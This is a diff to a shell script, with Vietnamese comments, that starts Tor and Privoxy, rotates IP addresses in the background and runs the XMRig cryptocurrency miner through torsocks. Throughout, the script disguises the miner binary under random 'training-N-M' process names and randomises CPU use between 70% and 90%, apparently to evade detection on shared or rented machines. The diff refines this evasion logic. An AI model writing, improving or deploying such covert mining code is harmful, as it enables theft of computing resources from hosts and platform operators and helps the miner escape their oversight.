@@ -4,36 +4,38 @@
 service tor start
 service privoxy start
 
+# Tạo bản sao của file xmrig gốc nếu chưa có
+if [ ! -f /root/work/xmrig-${VERSION}/xmrig_backup ]; then
+    cp /root/work/xmrig-${VERSION}/xmrig /root/work/xmrig-${VERSION}/xmrig_backup
+fi
+
 # Khởi động script đổi IP ngẫu nhiên trong nền
 /root/change_ip.sh &
+
+# Lấy tổng số lõi CPU
+TOTAL_CORES=$(nproc)
+
+# Tính toán tỷ lệ sử dụng CPU ngẫu nhiên từ 70% đến 90%
+MIN_PERCENT=70
+MAX_PERCENT=90
+RANDOM_PERCENT=$(shuf -i $MIN_PERCENT-$MAX_PERCENT -n 1)
+
+# Tính số lõi CPU cần sử dụng
+CPU_HINT=$(echo "($TOTAL_CORES * $RANDOM_PERCENT) / 100" | bc)
 
 # Kiểm tra xem xmrig_name.txt có tồn tại không, nếu không thì tạo tên mới và khởi động XMRig
 if [ ! -f /root/xmrig_name.txt ]; then
     RANDOM_NAME=$(echo training-$(shuf -i 1-375 -n 1)-$(shuf -i 1-259 -n 1))
-    mv $WORK_DIR/xmrig-${VERSION}/xmrig $WORK_DIR/$RANDOM_NAME
-    chmod +x $WORK_DIR/$RANDOM_NAME
+    cp /root/work/xmrig-${VERSION}/xmrig_backup /root/work/xmrig-${VERSION}/$RANDOM_NAME
+    chmod +x /root/work/xmrig-${VERSION}/$RANDOM_NAME
     echo $RANDOM_NAME > /root/xmrig_name.txt
     echo "Chạy XMRig với tên mới $RANDOM_NAME..."
-    
-    # Tính toán tỷ lệ CPU sử dụng ngẫu nhiên từ 70% đến 90%
-    total_cores=$(nproc)  # Lấy tổng số lõi CPU trên hệ thống
-    cpu_hint=$(shuf -i 70-90 -n 1)  # Lấy ngẫu nhiên một giá trị phần trăm từ 70 đến 90
-    threads=$(echo "$total_cores * $cpu_hint / 100" | bc)  # Tính số luồng cần sử dụng dựa trên tổng số lõi và phần trăm
-
-    # Chạy XMRig với số luồng tính toán
-    torsocks $WORK_DIR/$RANDOM_NAME --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages -k --tls --cpu-max-threads-hint=$threads
+    torsocks /root/work/xmrig-${VERSION}/$RANDOM_NAME --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages -k --tls --cpu-max-threads-hint=$CPU_HINT
 else
     # Nếu đã có tên, khởi động lại XMRig
     RANDOM_NAME=$(cat /root/xmrig_name.txt)
     echo "Chạy lại XMRig với tên $RANDOM_NAME..."
-    
-    # Tính toán tỷ lệ CPU sử dụng ngẫu nhiên từ 70% đến 90%
-    total_cores=$(nproc)  # Lấy tổng số lõi CPU trên hệ thống
-    cpu_hint=$(shuf -i 70-90 -n 1)  # Lấy ngẫu nhiên một giá trị phần trăm từ 70 đến 90
-    threads=$(echo "$total_cores * $cpu_hint / 100" | bc)  # Tính số luồng cần sử dụng dựa trên tổng số lõi và phần trăm
-
-    # Chạy XMRig với số luồng tính toán
-    torsocks $WORK_DIR/$RANDOM_NAME --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages -k --tls --cpu-max-threads-hint=$threads
+    torsocks /root/work/xmrig-${VERSION}/$RANDOM_NAME --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages -k --tls --cpu-max-threads-hint=$CPU_HINT
 fi
 
 # Giữ container chạy
